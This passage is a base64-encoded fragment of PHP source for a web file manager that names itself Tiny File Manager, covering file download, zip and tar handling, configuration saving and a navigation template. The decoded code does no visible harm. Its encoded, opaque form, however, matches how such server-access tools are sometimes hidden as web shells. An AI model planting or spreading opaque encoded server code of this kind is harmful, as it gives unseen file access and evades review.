VEgpKTsNCg0KICAgICAgICByZXR1cm4gKGZhbHNlKTsNCiAgICB9DQoNCiAgICBAaW5pX3NldCgnbWFnaWNfcXVvdGVzX3J1bnRpbWUnLCAwKTsNCiAgICAkZnAgPSBmb3BlbigiJGZpbGVMb2NhdGlvbiIsICJyYiIpOw0KDQogICAgaWYgKCRmcCA9PT0gZmFsc2UpIHsNCiAgICAgICAgZm1fc2V0X21zZyhsbmcoJ0Nhbm5vdCBvcGVuIGZpbGUhIEFib3J0aW5nIGRvd25sb2FkJyksICdlcnJvcicpOw0KICAgICAgICAkRk1fUEFUSCA9IEZNX1BBVEg7DQogICAgICAgIGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScgLiB1cmxlbmNvZGUoJEZNX1BBVEgpKTsNCiAgICAgICAgcmV0dXJuIChmYWxzZSk7DQogICAgfQ0KDQogICAgLy8gaGVhZGVycw0KICAgIGhlYWRlcignQ29udGVudC1EZXNjcmlwdGlvbjogRmlsZSBUcmFuc2ZlcicpOw0KICAgIGhlYWRlcignRXhwaXJlczogMCcpOw0KICAgIGhlYWRlcignQ2FjaGUtQ29udHJvbDogbXVzdC1yZXZhbGlkYXRlLCBwb3N0LWNoZWNrPTAsIHByZS1jaGVjaz0wJyk7DQogICAgaGVhZGVyKCdQcmFnbWE6IHB1YmxpYycpOw0KICAgIGhlYWRlcigiQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZzogYmluYXJ5Iik7DQogICAgaGVhZGVyKCJDb250ZW50LVR5cGU6ICRjb250ZW50VHlwZSIpOw0KDQogICAgJGNvbnRlbnREaXNwb3NpdGlvbiA9ICdhdHRhY2htZW50JzsNCg0KICAgIGlmIChzdHJzdHIoJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddLCAiTVNJRSIpKSB7DQogICAgICAgICRmaWxlTmFtZSA9IHByZWdfcmVwbGFjZSgnL1wuLycsICclMmUnLCAkZmlsZU5hbWUsIHN1YnN0cl9jb3VudCgkZmlsZU5hbWUsICcuJykgLSAxKTsNCiAgICAgICAgaGVhZGVyKCJDb250ZW50LURpc3Bvc2l0aW9uOiAkY29udGVudERpc3Bvc2l0aW9uO2ZpbGVuYW1lPVwiJGZpbGVOYW1lXCIiKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICBoZWFkZXIoIkNvbnRlbnQtRGlzcG9zaXRpb246ICRjb250ZW50RGlzcG9zaXRpb247ZmlsZW5hbWU9XCIkZmlsZU5hbWVcIiIpOw0KICAgIH0NCg0KICAgIGhlYWRlcigiQWNjZXB0LVJhbmdlczogYnl0ZXMiKTsNCiAgICAkcmFuZ2UgPSAwOw0KDQogICAgaWYgKGlzc2V0KCRfU0VSVkVSWydIVFRQX1JBTkdFJ10pKSB7DQogICAgICAgIGxpc3QoJGEsICRyYW5nZSkgPSBleHBsb2RlKCI9IiwgJF9TRVJWRVJbJ0hUVFBfUkFOR0UnXSk7DQogICAgICAgIHN0cl9yZXBsYWNlKCRyYW5nZSwgIi0iLCAkcmFuZ2UpOw0KICAgICAgICAkc2l6ZTIgPSAkc2l6ZSAtIDE7DQogICAgICAgICRuZXdfbGVuZ3RoID0gJHNpemUgLSAkcmFuZ2U7DQogICAgICAgIGhlYWRlcigiSFRUUC8xLjEgMjA2IFBhcnRpYWwgQ29udGVudCIpOw0KICAgICAgICBoZWFkZXIoIkNvbnRlbnQtTGVuZ3RoOiAkbmV3X2xlbmd0aCIpOw0KICAgICAgICBoZWFkZXIoIkNvbnRlbnQtUmFuZ2U6IGJ5dGVzICRyYW5nZSRzaXplMi8kc2l6ZSIpOw0KICAgIH0gZWxzZSB7DQogICAgICAgICRzaXplMiA9ICRzaXplIC0gMTsNCiAgICAgICAgaGVhZGVyKCJDb250ZW50LVJhbmdlOiBieXRlcyAwLSRzaXplMi8kc2l6ZSIpOw0KICAgICAgICBoZWFkZXIoIkNvbnRlbnQtTGVuZ3RoOiAiIC4gJHNpemUpOw0KICAgIH0NCiAgICAkZmlsZUxvY2F0aW9uID0gcmVhbHBhdGgoJGZpbGVMb2NhdGlvbik7DQogICAgd2hpbGUgKG9iX2dldF9sZXZlbCgpKSBvYl9lbmRfY2xlYW4oKTsNCiAgICByZWFkZmlsZSgkZmlsZUxvY2F0aW9uKTsNCg0KICAgIGZjbG9zZSgkZnApOw0KDQogICAgcmV0dXJuICgoY29ubmVjdGlvbl9zdGF0dXMoKSA9PSAwKSBhbmQgIWNvbm5lY3Rpb25fYWJvcnRlZCgpKTsNCn0NCg0KLyoqDQogKiBDbGFzcyB0byB3b3JrIHdpdGggemlwIGZpbGVzICh1c2luZyBaaXBBcmNoaXZlKQ0KICovDQpjbGFzcyBGTV9aaXBwZXINCnsNCiAgICBwcml2YXRlICR6aXA7DQoNCiAgICBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoKQ0KICAgIHsNCiAgICAgICAgJHRoaXMtPnppcCA9IG5ldyBaaXBBcmNoaXZlKCk7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogQ3JlYXRlIGFyY2hpdmUgd2l0aCBuYW1lICRmaWxlbmFtZSBhbmQgZmlsZXMgJGZpbGVzIChSRUxBVElWRSBQQVRIUyEpDQogICAgICogQHBhcmFtIHN0cmluZyAkZmlsZW5hbWUNCiAgICAgKiBAcGFyYW0gYXJyYXl8c3RyaW5nICRmaWxlcw0KICAgICAqIEByZXR1cm4gYm9vbA0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiBjcmVhdGUoJGZpbGVuYW1lLCAkZmlsZXMpDQogICAgew0KICAgICAgICAkcmVzID0gJHRoaXMtPnppcC0+b3BlbigkZmlsZW5hbWUsIFppcEFyY2hpdmU6OkNSRUFURSk7DQogICAgICAgIGlmICgkcmVzICE9PSB0cnVlKSB7DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgaWYgKGlzX2FycmF5KCRmaWxlcykpIHsNCiAgICAgICAgICAgIGZvcmVhY2ggKCRmaWxlcyBhcyAkZikgew0KICAgICAgICAgICAgICAgICRmID0gZm1fY2xlYW5fcGF0aCgkZik7DQogICAgICAgICAgICAgICAgaWYgKCEkdGhpcy0+YWRkRmlsZU9yRGlyKCRmKSkgew0KICAgICAgICAgICAgICAgICAgICAkdGhpcy0+emlwLT5jbG9zZSgpOw0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJHRoaXMtPnppcC0+Y2xvc2UoKTsNCiAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgaWYgKCR0aGlzLT5hZGRGaWxlT3JEaXIoJGZpbGVzKSkgew0KICAgICAgICAgICAgICAgICR0aGlzLT56aXAtPmNsb3NlKCk7DQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBFeHRyYWN0IGFyY2hpdmUgJGZpbGVuYW1lIHRvIGZvbGRlciAkcGF0aCAoUkVMQVRJVkUgT1IgQUJTT0xVVEUgUEFUSFMpDQogICAgICogQHBhcmFtIHN0cmluZyAkZmlsZW5hbWUNCiAgICAgKiBAcGFyYW0gc3RyaW5nICRwYXRoDQogICAgICogQHJldHVybiBib29sDQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIHVuemlwKCRmaWxlbmFtZSwgJHBhdGgpDQogICAgew0KICAgICAgICAkcmVzID0gJHRoaXMtPnppcC0+b3BlbigkZmlsZW5hbWUpOw0KICAgICAgICBpZiAoJHJlcyAhPT0gdHJ1ZSkgew0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgIGlmICgkdGhpcy0+emlwLT5leHRyYWN0VG8oJHBhdGgpKSB7DQogICAgICAgICAgICAkdGhpcy0+emlwLT5jbG9zZSgpOw0KICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIEFkZCBmaWxlL2ZvbGRlciB0byBhcmNoaXZlDQogICAgICogQHBhcmFtIHN0cmluZyAkZmlsZW5hbWUNCiAgICAgKiBAcmV0dXJuIGJvb2wNCiAgICAgKi8NCiAgICBwcml2YXRlIGZ1bmN0aW9uIGFkZEZpbGVPckRpcigkZmlsZW5hbWUpDQogICAgew0KICAgICAgICBpZiAoaXNfZmlsZSgkZmlsZW5hbWUpKSB7DQogICAgICAgICAgICByZXR1cm4gJHRoaXMtPnppcC0+YWRkRmlsZSgkZmlsZW5hbWUpOw0KICAgICAgICB9IGVsc2VpZiAoaXNfZGlyKCRmaWxlbmFtZSkpIHsNCiAgICAgICAgICAgIHJldHVybiAkdGhpcy0+YWRkRGlyKCRmaWxlbmFtZSk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIEFkZCBmb2xkZXIgcmVjdXJzaXZlbHkNCiAgICAgKiBAcGFyYW0gc3RyaW5nICRwYXRoDQogICAgICogQHJldHVybiBib29sDQogICAgICovDQogICAgcHJpdmF0ZSBmdW5jdGlvbiBhZGREaXIoJHBhdGgpDQogICAgew0KICAgICAgICBpZiAoISR0aGlzLT56aXAtPmFkZEVtcHR5RGlyKCRwYXRoKSkgew0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgICRvYmplY3RzID0gc2NhbmRpcigkcGF0aCk7DQogICAgICAgIGlmIChpc19hcnJheSgkb2JqZWN0cykpIHsNCiAgICAgICAgICAgIGZvcmVhY2ggKCRvYmplY3RzIGFzICRmaWxlKSB7DQogICAgICAgICAgICAgICAgaWYgKCRmaWxlICE9ICcuJyAmJiAkZmlsZSAhPSAnLi4nKSB7DQogICAgICAgICAgICAgICAgICAgIGlmIChpc19kaXIoJHBhdGggLiAnLycgLiAkZmlsZSkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghJHRoaXMtPmFkZERpcigkcGF0aCAuICcvJyAuICRmaWxlKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlaWYgKGlzX2ZpbGUoJHBhdGggLiAnLycgLiAkZmlsZSkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghJHRoaXMtPnppcC0+YWRkRmlsZSgkcGF0aCAuICcvJyAuICRmaWxlKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9DQp9DQoNCi8qKg0KICogQ2xhc3MgdG8gd29yayB3aXRoIFRhciBmaWxlcyAodXNpbmcgUGhhckRhdGEpDQogKi8NCmNsYXNzIEZNX1ppcHBlcl9UYXINCnsNCiAgICBwcml2YXRlICR0YXI7DQoNCiAgICBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoKQ0KICAgIHsNCiAgICAgICAgJHRoaXMtPnRhciA9IG51bGw7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogQ3JlYXRlIGFyY2hpdmUgd2l0aCBuYW1lICRmaWxlbmFtZSBhbmQgZmlsZXMgJGZpbGVzIChSRUxBVElWRSBQQVRIUyEpDQogICAgICogQHBhcmFtIHN0cmluZyAkZmlsZW5hbWUNCiAgICAgKiBAcGFyYW0gYXJyYXl8c3RyaW5nICRmaWxlcw0KICAgICAqIEByZXR1cm4gYm9vbA0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiBjcmVhdGUoJGZpbGVuYW1lLCAkZmlsZXMpDQogICAgew0KICAgICAgICAkdGhpcy0+dGFyID0gbmV3IFBoYXJEYXRhKCRmaWxlbmFtZSk7DQogICAgICAgIGlmIChpc19hcnJheSgkZmlsZXMpKSB7DQogICAgICAgICAgICBmb3JlYWNoICgkZmlsZXMgYXMgJGYpIHsNCiAgICAgICAgICAgICAgICAkZiA9IGZtX2NsZWFuX3BhdGgoJGYpOw0KICAgICAgICAgICAgICAgIGlmICghJHRoaXMtPmFkZEZpbGVPckRpcigkZikpIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgaWYgKCR0aGlzLT5hZGRGaWxlT3JEaXIoJGZpbGVzKSkgew0KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgfQ0KDQogICAgLyoqDQogICAgICogRXh0cmFjdCBhcmNoaXZlICRmaWxlbmFtZSB0byBmb2xkZXIgJHBhdGggKFJFTEFUSVZFIE9SIEFCU09MVVRFIFBBVEhTKQ0KICAgICAqIEBwYXJhbSBzdHJpbmcgJGZpbGVuYW1lDQogICAgICogQHBhcmFtIHN0cmluZyAkcGF0aA0KICAgICAqIEByZXR1cm4gYm9vbA0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiB1bnppcCgkZmlsZW5hbWUsICRwYXRoKQ0KICAgIHsNCiAgICAgICAgJHJlcyA9ICR0aGlzLT50YXItPm9wZW4oJGZpbGVuYW1lKTsNCiAgICAgICAgaWYgKCRyZXMgIT09IHRydWUpIHsNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoJHRoaXMtPnRhci0+ZXh0cmFjdFRvKCRwYXRoKSkgew0KICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIEFkZCBmaWxlL2ZvbGRlciB0byBhcmNoaXZlDQogICAgICogQHBhcmFtIHN0cmluZyAkZmlsZW5hbWUNCiAgICAgKiBAcmV0dXJuIGJvb2wNCiAgICAgKi8NCiAgICBwcml2YXRlIGZ1bmN0aW9uIGFkZEZpbGVPckRpcigkZmlsZW5hbWUpDQogICAgew0KICAgICAgICBpZiAoaXNfZmlsZSgkZmlsZW5hbWUpKSB7DQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgICR0aGlzLT50YXItPmFkZEZpbGUoJGZpbGVuYW1lKTsNCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiAkZSkgew0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlaWYgKGlzX2RpcigkZmlsZW5hbWUpKSB7DQogICAgICAgICAgICByZXR1cm4gJHRoaXMtPmFkZERpcigkZmlsZW5hbWUpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBBZGQgZm9sZGVyIHJlY3Vyc2l2ZWx5DQogICAgICogQHBhcmFtIHN0cmluZyAkcGF0aA0KICAgICAqIEByZXR1cm4gYm9vbA0KICAgICAqLw0KICAgIHByaXZhdGUgZnVuY3Rpb24gYWRkRGlyKCRwYXRoKQ0KICAgIHsNCiAgICAgICAgJG9iamVjdHMgPSBzY2FuZGlyKCRwYXRoKTsNCiAgICAgICAgaWYgKGlzX2FycmF5KCRvYmplY3RzKSkgew0KICAgICAgICAgICAgZm9yZWFjaCAoJG9iamVjdHMgYXMgJGZpbGUpIHsNCiAgICAgICAgICAgICAgICBpZiAoJGZpbGUgIT0gJy4nICYmICRmaWxlICE9ICcuLicpIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKGlzX2RpcigkcGF0aCAuICcvJyAuICRmaWxlKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCEkdGhpcy0+YWRkRGlyKCRwYXRoIC4gJy8nIC4gJGZpbGUpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9IGVsc2VpZiAoaXNfZmlsZSgkcGF0aCAuICcvJyAuICRmaWxlKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+dGFyLT5hZGRGaWxlKCRwYXRoIC4gJy8nIC4gJGZpbGUpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uICRlKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCn0NCg0KLyoqDQogKiBTYXZlIENvbmZpZ3VyYXRpb24NCiAqLw0KY2xhc3MgRk1fQ29uZmlnDQp7DQogICAgdmFyICRkYXRhOw0KDQogICAgZnVuY3Rpb24gX19jb25zdHJ1Y3QoKQ0KICAgIHsNCiAgICAgICAgZ2xvYmFsICRyb290X3BhdGgsICRyb290X3VybCwgJENPTkZJRzsNCiAgICAgICAgJGZtX3VybCA9ICRyb290X3VybCAuICRfU0VSVkVSWyJQSFBfU0VMRiJdOw0KICAgICAgICAkdGhpcy0+ZGF0YSA9IGFycmF5KA0KICAgICAgICAgICAgJ2xhbmcnID0+ICdlbicsDQogICAgICAgICAgICAnZXJyb3JfcmVwb3J0aW5nJyA9PiB0cnVlLA0KICAgICAgICAgICAgJ3Nob3dfaGlkZGVuJyA9PiB0cnVlDQogICAgICAgICk7DQogICAgICAgICRkYXRhID0gZmFsc2U7DQogICAgICAgIGlmIChzdHJsZW4oJENPTkZJRykpIHsNCiAgICAgICAgICAgICRkYXRhID0gZm1fb2JqZWN0X3RvX2FycmF5KGpzb25fZGVjb2RlKCRDT05GSUcpKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRtc2cgPSAnVGlueSBGaWxlIE1hbmFnZXI8YnI+RXJyb3I6IENhbm5vdCBsb2FkIGNvbmZpZ3VyYXRpb24nOw0KICAgICAgICAgICAgaWYgKHN1YnN0cigkZm1fdXJsLCAtMSkgPT0gJy8nKSB7DQogICAgICAgICAgICAgICAgJGZtX3VybCA9IHJ0cmltKCRmbV91cmwsICcvJyk7DQogICAgICAgICAgICAgICAgJG1zZyAuPSAnPGJyPic7DQogICAgICAgICAgICAgICAgJG1zZyAuPSAnPGJyPlNlZW1zIGxpa2UgeW91IGhhdmUgYSB0cmFpbGluZyBzbGFzaCBvbiB0aGUgVVJMLic7DQogICAgICAgICAgICAgICAgJG1zZyAuPSAnPGJyPlRyeSB0aGlzIGxpbms6IDxhIGhyZWY9IicgLiAkZm1fdXJsIC4gJyI+JyAuICRmbV91cmwgLiAnPC9hPic7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBkaWUoJG1zZyk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKGlzX2FycmF5KCRkYXRhKSAmJiBjb3VudCgkZGF0YSkpICR0aGlzLT5kYXRhID0gJGRhdGE7DQogICAgICAgIGVsc2UgJHRoaXMtPnNhdmUoKTsNCiAgICB9DQoNCiAgICBmdW5jdGlvbiBzYXZlKCkNCiAgICB7DQogICAgICAgIGdsb2JhbCAkY29uZmlnX2ZpbGU7DQogICAgICAgICRmbV9maWxlID0gaXNfcmVhZGFibGUoJGNvbmZpZ19maWxlKSA/ICRjb25maWdfZmlsZSA6IF9fRklMRV9fOw0KICAgICAgICAkdmFyX25hbWUgPSAnJENPTkZJRyc7DQogICAgICAgICR2YXJfdmFsdWUgPSB2YXJfZXhwb3J0KGpzb25fZW5jb2RlKCR0aGlzLT5kYXRhKSwgdHJ1ZSk7DQogICAgICAgICRjb25maWdfc3RyaW5nID0gIjw/cGhwIiAuIGNocigxMykgLiBjaHIoMTApIC4gIi8vRGVmYXVsdCBDb25maWd1cmF0aW9uIiAuIGNocigxMykgLiBjaHIoMTApIC4gIiR2YXJfbmFtZSA9ICR2YXJfdmFsdWU7IiAuIGNocigxMykgLiBjaHIoMTApOw0KICAgICAgICBpZiAoaXNfd3JpdGFibGUoJGZtX2ZpbGUpKSB7DQogICAgICAgICAgICAkbGluZXMgPSBmaWxlKCRmbV9maWxlKTsNCiAgICAgICAgICAgIGlmICgkZmggPSBAZm9wZW4oJGZtX2ZpbGUsICJ3IikpIHsNCiAgICAgICAgICAgICAgICBAZnB1dHMoJGZoLCAkY29uZmlnX3N0cmluZywgc3RybGVuKCRjb25maWdfc3RyaW5nKSk7DQogICAgICAgICAgICAgICAgZm9yICgkeCA9IDM7ICR4IDwgY291bnQoJGxpbmVzKTsgJHgrKykgew0KICAgICAgICAgICAgICAgICAgICBAZnB1dHMoJGZoLCAkbGluZXNbJHhdLCBzdHJsZW4oJGxpbmVzWyR4XSkpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBAZmNsb3NlKCRmaCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQp9DQoNCi8vLS0tIFRlbXBsYXRlcyBGdW5jdGlvbnMgLS0tDQoNCi8qKg0KICogU2hvdyBuYXYgYmxvY2sNCiAqIEBwYXJhbSBzdHJpbmcgJHBhdGgNCiAqLw0KZnVuY3Rpb24gZm1fc2hvd19uYXZfcGF0aCgkcGF0aCkNCnsNCiAgICBnbG9iYWwgJGxhbmcsICRzdGlja3lfbmF2YmFyLCAkZWRpdEZpbGU7DQogICAgJGlzU3RpY2t5TmF2QmFyID0gJHN0aWNreV9uYXZiYXIgPyAnZml4ZWQtdG9wJyA6ICcnOw0KPz4NCiAgICA8bmF2IGNsYXNzPSJuYXZiYXIgbmF2YmFyLWV4cGFuZC1sZyBtYi00IG1haW4tbmF2IDw/cGhwIGVjaG8gJGlzU3RpY2t5TmF2QmFyID8+IGJnLWJvZHktdGVydGlhcnkiIGRhdGEtYnMtdGhlbWU9Ijw/cGhwIGVjaG8gRk1fVEhFTUU7ID8+Ij4NCiAgICAgICAgPGEgY2xhc3M9Im5hdmJhci1icmFuZCI+IDw/cGhwIGVjaG8gbG5nKCdBcHBUaXRsZScpID8+IDwvYT4NCiAgICAgICAgPGJ1dHRvbiBjbGFzcz0ibmF2YmFyLXRvZ2dsZXIiIHR5cGU9ImJ1dHRvbiIgZGF0YS1icy10b2dnbGU9ImNvbGxhcHNlIiBkYXRhLWJzLXRhcmdldD0iI25hdmJhclN1cHBvcnRlZENvbnRlbnQiIGFyaWEtY29udHJvbHM9Im5hdmJhclN1cHBvcnRlZENvbnRlbnQiIGFyaWEtZXhwYW5kZWQ9ImZhbHNlIiBhcmlhLWxhYmVsPSJUb2dnbGUgbmF2aWdhdGlvbiI+DQogICAgICAgICAgICA8c3BhbiBjbGFzcz0ibmF2YmFyLXRvZ2dsZXItaWNvbiI+PC9zcGFuPg0KICAgICAgICA8L2J1dHRvbj4NCiAgICAgICAgPGRpdiBjbGFzcz0iY29sbGFwc2UgbmF2YmFyLWNvbGxhcHNlIiBpZD0ibmF2YmFyU3VwcG9ydGVkQ29udGVudCI+DQoNCiAgICAgICAgICAgIDw/cGhwDQogICAgICAgICAgICAkcGF0aCA9IGZtX2NsZWFuX3BhdGgoJHBhdGgpOw0KICAgICAgICAgICAgJHJvb3RfdXJsID0gIjxhIGhyZWY9Jz9wPSc+PGkgY2xhc3M9J2ZhIGZhLWhvbWUnIGFyaWEtaGlkZGVuPSd0cnVlJyB0aXRsZT0nIiAuIEZNX1JPT1RfUEFUSCAuICInPjwvaT48L2E+IjsNCiAgICAgICAgICAgICRzZXAgPSAnPGkgY2xhc3M9ImJyZWFkLWNydW1iIj4gLyA8L2k+JzsNCiAgICAgICAgICAgIGlmICgkcGF0aCAhPSAnJykgew0KICAgICAgICAgICAgICAgICRleHBsb2RlZCA9IGV4cGxvZGUoJy8nLCAkcGF0aCk7DQogICAgICAgICAgICAgICAgJGNvdW50ID0gY291bnQoJGV4cGxvZGVkKTsNCiAgICAgICAgICAgICAgICAkYXJyYXkgPSBhcnJheSgpOw0KICAgICAgICAgICAgICAgICRwYXJlbnQgPSAnJzsNCiAgICAgICAgICAgICAgICBmb3IgKCRpID0gMDsgJGkgPCAkY291bnQ7ICRpKyspIHsNCiAgICAgICAgICAgICAgICAgICAgJHBhcmVudCA9IHRyaW0oJHBhcmVudCAuICcvJyAuICRleHBsb2RlZFskaV0sICcvJyk7DQogICAgICAgICAgICAgICAgICAgICRwYXJlbnRfZW5jID0gdXJsZW5jb2RlKCRwYXJlbnQpOw0KICAgICAgICAgICAgICAgICAgICAkYXJyYXlbXSA9ICI8YSBocmVmPSc/cD17JHBhcmVudF9lbmN9Jz4iIC4gZm1fZW5jKGZtX2NvbnZlcnRfd2luKCRleHBsb2RlZFskaV0pKSAuICI8L2E+IjsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJHJvb3RfdXJsIC49ICRzZXAgLiBpbXBsb2RlKCRzZXAsICRhcnJheSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlY2hvICc8ZGl2IGNsYXNzPSJjb2wteHMtNiBjb2wtc20tNSI+JyAuICRyb290X3VybCAuICRlZGl0RmlsZSAuICc8L2Rpdj4nOw0KICAgICAgICAgICAgPz4NCg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXhzLTYgY29sLXNtLTciPg0KICAgICAgICAgICAgICAgIDx1bCBjbGFzcz0ibmF2YmFyLW5hdiBqdXN0aWZ5LWNvbnRlbnQtZW5kIiBkYXRhLWJzLXRoZW1lPSI8P3BocCBlY2hvIEZNX1RIRU1FOyA/PiI+DQogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0gbXItMiI+DQogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJpbnB1dC1ncm91cCBpbnB1dC1ncm91cC1zbSBtci0xIiBzdHlsZT0ibWFyZ2luLXRvcDo0cHg7Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImZvcm0tY29udHJvbCIgcGxhY2Vob2xkZXI9Ijw/cGhwIGVjaG8gbG5nKCdTZWFyY2gnKSA/PiIgYXJpYS1sYWJlbD0iPD9waHAgZWNobyBsbmcoJ1NlYXJjaCcpID8+IiBhcmlhLWRlc2NyaWJlZGJ5PSJzZWFyY2gtYWRkb24yIiBpZD0ic2VhcmNoLWFkZG9uIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJpbnB1dC1ncm91cC1hcHBlbmQiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0iaW5wdXQtZ3JvdXAtdGV4dCBicmwtMCBicnItMCIgaWQ9InNlYXJjaC1hZGRvbjIiPjxpIGNsYXNzPSJmYSBmYS1zZWFyY2giPjwvaT48L3NwYW4+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAtYXBwZW5kIGJ0bi1ncm91cCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJpbnB1dC1ncm91cC10ZXh0IGRyb3Bkb3duLXRvZ2dsZSBicmwtMCIgZGF0YS1icy10b2dnbGU9ImRyb3Bkb3duIiBhcmlhLWhhc3BvcHVwPSJ0cnVlIiBhcmlhLWV4cGFuZGVkPSJmYWxzZSI+PC9zcGFuPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkcm9wZG93bi1tZW51IGRyb3Bkb3duLW1lbnUtcmlnaHQiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9ImRyb3Bkb3duLWl0ZW0iIGhyZWY9Ijw/cGhwIGVjaG8gJHBhdGgyID0gJHBhdGggPyAkcGF0aCA6ICcuJzsgPz4iIGlkPSJqcy1zZWFyY2gtbW9kYWwiIGRhdGEtYnMtdG9nZ2xlPSJtb2RhbCIgZGF0YS1icy10YXJnZXQ9IiNzZWFyY2hNb2RhbCI+PD9waHAgZWNobyBsbmcoJ0FkdmFuY2VkIFNlYXJjaCcpID8+PC9hPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAg